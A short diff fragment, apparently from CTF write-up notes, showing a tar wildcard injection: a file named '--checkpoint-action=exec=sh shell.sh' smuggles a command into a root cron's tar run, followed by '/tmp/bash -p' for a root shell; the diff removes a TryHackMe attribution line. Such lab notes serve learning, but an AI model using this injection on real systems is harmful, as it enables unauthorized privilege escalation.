@@ -11,4 +11,3 @@ touch -- '--checkpoint-action=exec=sh shell.sh'
 /tmp/bash -p
 ```
 
-— TryHackMe / Operation Coldstart (root cron ran `tar czf ... *` inside a webdev-writable `/opt/backups`)
